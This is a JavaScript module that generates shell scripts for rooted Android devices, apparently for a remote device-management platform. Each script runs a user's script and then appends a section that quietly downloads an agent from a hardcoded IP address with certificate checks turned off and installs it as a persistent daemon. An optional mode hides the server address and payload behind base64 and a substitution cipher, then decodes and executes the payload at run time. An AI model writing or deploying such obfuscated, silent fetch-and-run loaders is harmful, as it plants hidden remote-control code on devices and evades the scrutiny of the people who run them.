import { config } from './config.js';

/**
 * 生成注入脚本。
 *
 * 设计要点：
 *  1. 业务脚本先用 heredoc 存成变量，再**落盘成临时文件后直接执行**。
 *     不能用 `| sh` —— 管道会占用标准输入，交互式脚本（要你敲选项的那种）会收不到按键。
 *  2. **对接段固定在最后**（它要装守护并常驻，放前面业务脚本永远不执行）。
 *  3. `quietInstall`（旧字段名 silent）：**只**静默对接段，业务脚本输出与交互照常。
 *  4. `encrypt`：脚本文件里不带业务内容，运行时向服务器实时拉取（服务端下发模式）。
 *  5. 全过程写 $DIR/inject.log，出问题能查。
 */
export function buildInjectionScript(project, baseUrl, opts = {}) {
  const o = project.options || {};
  const quietInstall = o.quietInstall !== undefined ? o.quietInstall !== false : o.silent !== false;
  const encrypt = !!o.encrypt;
  const base = String(baseUrl || publicBase()).replace(/\/+$/, '');
  const quiet = quietInstall ? '>/dev/null 2>&1' : '';

  // 自研加密：地址/下载码/接口路径/目录全部 base64，正文用置换密文，文件里不出现任何明文
  if (encrypt && !opts.forceLocal) {
    const enc = (v) => Buffer.from(String(v ?? ''), 'utf8').toString('base64');
    const aBase = enc(base);
    const bCode = enc(opts.code || '');
    const cPath = enc('/api/projects/bootstrap/key');
    const dDir = enc('/data/adb/remoteagent');
    const cipher = opts.cipher || '';

    return `#!/system/bin/sh
a='${aBase}'
b='${bCode}'
c='${cPath}'
d='${dDir}'
k='${cipher}'

u="$(printf %s "$a"|base64 -d)$(printf %s "$c"|base64 -d)?code=$(printf %s "$b"|base64 -d)"
A=$(curl -k -fsSL -m 30 "$u")
[ -n "$A" ] || { echo "[x] key" >&2; exit 1; }

D=$(printf %s "$d"|base64 -d)
mkdir -p "$D" 2>/dev/null

S=$(printf %s "$k" | awk -v A="$A" -v B='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' '
{ r=""; n=length($0); for(i=1;i<=n;i++){ q=substr($0,i,1); p=index(A,q); r=r (p>0?substr(B,p,1):q) } print r }')
[ -n "$S" ] || { echo "[x] dec" >&2; exit 1; }

P="$D/$$"
printf %s "$S" | base64 -d > "$P" || { echo "[x] b64" >&2; rm -f "$P"; exit 1; }
sh "$P"
rm -f "$P"
exit 0
`;
  }

  const payload = (project.script || '').replace(/\r\n/g, '\n');

  return `#!/system/bin/sh
# ============================================================
# 项目：${project.name}
# 由「远程安卓设备运维平台」自动生成
# 注意：最后的对接段不要移动或删除，否则设备不会上线
# ============================================================

DIR=/data/adb/remoteagent
ILOG="$DIR/inject.log"
mkdir -p "$DIR" 2>/dev/null

# ---------- 1. 业务脚本（落盘执行，stdin/stdout 都继承终端） ----------
_PAYLOAD=$(cat <<'__PAYLOAD_END__'
${payload}
__PAYLOAD_END__
)
_PAYF="$DIR/payload.$$.sh"
printf '%s\\n' "$_PAYLOAD" > "$_PAYF" 2>/dev/null
if [ -s "$_PAYF" ]; then
    sh "$_PAYF"
    _rc=$?
    rm -f "$_PAYF"
    echo "[inject] $(date '+%Y-%m-%d %H:%M:%S') 业务脚本退出码=$_rc" >> "$ILOG" 2>/dev/null
else
    echo "[inject] 业务脚本写出失败，跳过" >> "$ILOG" 2>/dev/null
fi

# ---------- 2. 对接段（必须在最后） ----------
BASE='${base}'
TOKEN='${project.token}'
PROJ='${project.id}'

printf '%s' "$TOKEN" > "$DIR/token"
printf 'BASE=%s\\n' "$BASE" > "$DIR/config"
echo "[inject] $(date '+%Y-%m-%d %H:%M:%S') base=$BASE proj=$PROJ" >> "$ILOG" 2>/dev/null

curl -k -fsSL -m 30 "$BASE/api/projects/$PROJ/agent.sh?token=$TOKEN" -o "$DIR/agent.sh" ${quiet}
if [ -s "$DIR/agent.sh" ]; then
    echo "[inject] agent.sh $(wc -c < "$DIR/agent.sh") 字节，开始安装" >> "$ILOG" 2>/dev/null
    chmod 755 "$DIR/agent.sh"
    sh "$DIR/agent.sh" install ${quiet}
    echo "[inject] install 返回 $?" >> "$ILOG" 2>/dev/null
else
    echo "[inject] 下载 agent 失败（检查网络或服务端）" >> "$ILOG" 2>/dev/null
fi

exit 0
`;
}

/** 站点对外地址（可用环境变量 PUBLIC_BASE 覆盖） */
export function publicBase() {
  return config.publicBase || 'http://43.251.226.134';
}
